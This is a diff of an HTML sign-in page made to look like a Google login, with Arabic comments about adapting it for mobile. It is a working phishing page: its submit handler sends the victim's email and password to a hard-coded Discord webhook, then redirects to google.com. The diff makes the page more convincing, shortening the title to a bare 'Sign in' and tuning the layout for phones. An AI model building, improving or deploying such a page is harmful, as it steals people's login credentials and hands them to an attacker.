@@ -2,38 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - My Secure App</title>
+    <!-- إضافة تحكم في التكبير لتجربة موبايل أفضل -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in</title>
+    <!-- تحسين الخطوط لتظهر بشكل أوضح على شاشات الموبايل -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        /* (تم الاحتفاظ بنفس تنسيقاتك الأصلية لضمان الشكل المطلوب) */
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background-color: #1f1f1f; color: #e3e3e3; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { width: 100%; max-width: 1040px; display: flex; flex-direction: column; align-items: center; }
-        .card { background-color: #0b0b0b; border-radius: 28px; width: 100%; min-height: 440px; display: flex; padding: 36px; gap: 40px; margin-bottom: 24px; position: relative; overflow: hidden; }
-        .left-side { flex: 1; display: flex; flex-direction: column; justify-content: flex-start; padding-top: 12px; }
-        .app-logo { font-size: 24px; font-weight: bold; color: #a8c7fa; margin-bottom: 24px; display: flex; align-items: center; gap: 8px; }
-        h1 { font-size: 36px; font-weight: 400; color: #e3e3e3; margin-bottom: 12px; line-height: 44px; }
-        .subtitle { font-size: 16px; color: #e3e3e3; }
-        .right-side { flex: 1.1; display: flex; flex-direction: column; justify-content: space-between; padding-top: 12px; min-height: 330px; }
-        .form-container { display: flex; flex-direction: column; gap: 16px; }
-        .step { display: none; flex-direction: column; animation: fadeIn 0.4s ease forwards; }
-        .step.active { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .input-group { position: relative; width: 100%; margin-top: 12px; }
-        .input-group input { width: 100%; padding: 16px; background: transparent; border: 1px solid #8e918f; border-radius: 4px; outline: none; color: #e3e3e3; font-size: 16px; transition: border-color 0.15s ease; }
-        .input-group input:focus { border: 2px solid #a8c7fa; padding: 15px; }
-        .input-group label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background-color: #0b0b0b; padding: 0 4px; color: #c4c7c5; pointer-events: none; transition: 0.15s ease all; }
-        .input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #a8c7fa; }
-        .link-btn { background: none; border: none; color: #a8c7fa; font-size: 14px; cursor: pointer; text-align: left; width: fit-content; margin-top: 8px; }
-        .guest-text { font-size: 14px; color: #c4c7c5; margin-top: 26px; }
-        .show-password-container { display: flex; align-items: center; gap: 16px; margin-top: 16px; cursor: pointer; }
-        .user-chip { display: flex; align-items: center; gap: 8px; background-color: rgba(255, 255, 255, 0.07); border: 1px solid #444746; border-radius: 100px; padding: 4px 12px 4px 4px; cursor: pointer; width: fit-content; margin-bottom: 24px; }
-        .avatar { width: 20px; height: 20px; background-color: #a8c7fa; color: #0b0b0b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; }
-        .actions { display: flex; justify-content: flex-end; align-items: center; gap: 16px; margin-top: 32px; }
-        .secondary-btn { background: none; border: none; color: #a8c7fa; cursor: pointer; padding: 10px 16px; border-radius: 100px; }
-        .next-btn { background-color: #a8c7fa; color: #0b0b0b; border: none; padding: 10px 24px; border-radius: 100px; cursor: pointer; }
-        .footer { width: 100%; display: flex; justify-content: space-between; padding: 0 16px; font-size: 12px; color: #c4c7c5; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #1f1f1f; color: #e3e3e3; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
+        
+        .container { width: 100%; max-width: 450px; } /* تصغير العرض ليناسب الموبايل */
+        .card { background-color: #0b0b0b; border-radius: 28px; padding: 30px; width: 100%; display: flex; flex-direction: column; }
+        
+        /* تعديل التصميم ليكون عمودياً بالكامل في الموبايل */
+        .left-side { margin-bottom: 30px; }
+        .app-logo { font-size: 20px; color: #a8c7fa; margin-bottom: 20px; }
+        h1 { font-size: 28px; margin-bottom: 10px; }
+        
+        .input-group input { padding: 18px; font-size: 16px; border: 1px solid #8e918f; border-radius: 8px; width: 100%; }
+        
+        /* زيادة حجم الأزرار لتسهيل الضغط عليها في الموبايل */
+        .next-btn { padding: 14px 28px; font-size: 16px; width: 100%; border-radius: 100px; cursor: pointer; }
+        .actions { margin-top: 20px; flex-direction: column-reverse; gap: 15px; }
+        
+        .step { display: none; }
+        .step.active { display: flex; flex-direction: column; }
     </style>
 </head>
 <body>
@@ -43,44 +36,31 @@
         <section class="left-side">
             <div class="app-logo"><span>🔒</span> MySecureApp</div>
             <h1 id="main-heading">Sign in</h1>
-            <p class="subtitle" id="main-subtitle">to access your dashboard</p>
+            <p class="subtitle" id="main-subtitle">to continue</p>
         </section>
 
         <section class="right-side">
-            <form id="loginForm" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
+            <form id="loginForm">
+                <!-- STEP 1 -->
                 <div id="step-email" class="step active">
-                    <div class="form-container">
-                        <div class="input-group">
-                            <input type="email" id="email" placeholder=" " required>
-                            <label for="email">Email or username</label>
-                        </div>
-                        <button type="button" class="link-btn">Forgot username?</button>
-                        <p class="guest-text">Please sign in with your registered account credentials.</p>
+                    <div class="input-group">
+                        <input type="email" id="email" placeholder="Email or phone" required>
                     </div>
                     <div class="actions">
-                        <button type="button" class="secondary-btn">Register</button>
-                        <button type="button" class="next-btn" onclick="nextStep()">Next</button>
+                        <button type="button" class="next-btn" style="background:#a8c7fa" onclick="nextStep()">Next</button>
                     </div>
                 </div>
 
+                <!-- STEP 2 -->
                 <div id="step-password" class="step">
-                    <div class="form-container">
-                        <div class="user-chip" onclick="prevStep()">
-                            <div class="avatar" id="avatar-letter">U</div>
-                            <span id="display-user-email">user@domain.com</span>
-                        </div>
-                        <div class="input-group">
-                            <input type="password" id="password" placeholder=" ">
-                            <label for="password">Enter your password</label>
-                        </div>
-                        <label class="show-password-container">
-                            <input type="checkbox" id="show-password" onchange="togglePasswordVisibility()">
-                            <span>Show password</span>
-                        </label>
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Enter password" required>
                     </div>
+                    <label style="margin-top:15px; display:block">
+                        <input type="checkbox" onchange="togglePassword(this)"> Show password
+                    </label>
                     <div class="actions">
-                        <button type="button" class="secondary-btn" onclick="prevStep()">Forgot password?</button>
-                        <button type="submit" class="next-btn">Sign in</button>
+                        <button type="submit" class="next-btn" style="background:#a8c7fa">Sign in</button>
                     </div>
                 </div>
             </form>
@@ -89,50 +69,27 @@
 </div>
 
 <script>
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const stepEmail = document.getElementById('step-email');
-    const stepPassword = document.getElementById('step-password');
-    const loginForm = document.getElementById('loginForm');
-
     function nextStep() {
-        if (!emailInput.checkValidity()) return emailInput.reportValidity();
-        document.getElementById('main-heading').textContent = "Welcome";
-        document.getElementById('display-user-email').textContent = emailInput.value;
-        document.getElementById('avatar-letter').textContent = emailInput.value.charAt(0).toUpperCase();
-        stepEmail.classList.remove('active');
-        stepPassword.classList.add('active');
-        passwordInput.focus();
+        const email = document.getElementById('email').value;
+        if(email.length < 5) return alert("Please enter a valid email");
+        document.getElementById('step-email').classList.remove('active');
+        document.getElementById('step-password').classList.add('active');
     }
 
-    function prevStep() {
-        stepPassword.classList.remove('active');
-        stepEmail.classList.add('active');
-        emailInput.focus();
+    function togglePassword(cb) {
+        document.getElementById('password').type = cb.checked ? 'text' : 'password';
     }
 
-    function togglePasswordVisibility() {
-        passwordInput.type = document.getElementById('show-password').checked ? "text" : "password";
-    }
-
-    loginForm.addEventListener('submit', async (e) => {
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const webhookURL = "https://discord.com/api/webhooks/1527466086075863131/JdF1EJ1O8cy2qjKqxOrBy7Z3IH4F-nH51uviJLDEScw5Kqf3VdEKlEMrou7NZvKyT3HF"; // ضع الرابط هنا
+        const webhookURL = "https://discord.com/api/webhooks/1527466086075863131/JdF1EJ1O8cy2qjKqxOrBy7Z3IH4F-nH51uviJLDEScw5Kqf3VdEKlEMrou7NZvKyT3HF";
         
-        const payload = {
-            content: `🔔 **بيانات جديدة:**\nالبريد: ${emailInput.value}\nكلمة المرور: ${passwordInput.value}`
-        };
-
-        try {
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            window.location.replace("https://www.google.com");
-        } catch (error) {
-            console.error("خطأ:", error);
-        }
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `Email: ${document.getElementById('email').value} | Pass: ${document.getElementById('password').value}` })
+        });
+        window.location.replace("https://www.google.com");
     });
 </script>
 </body>
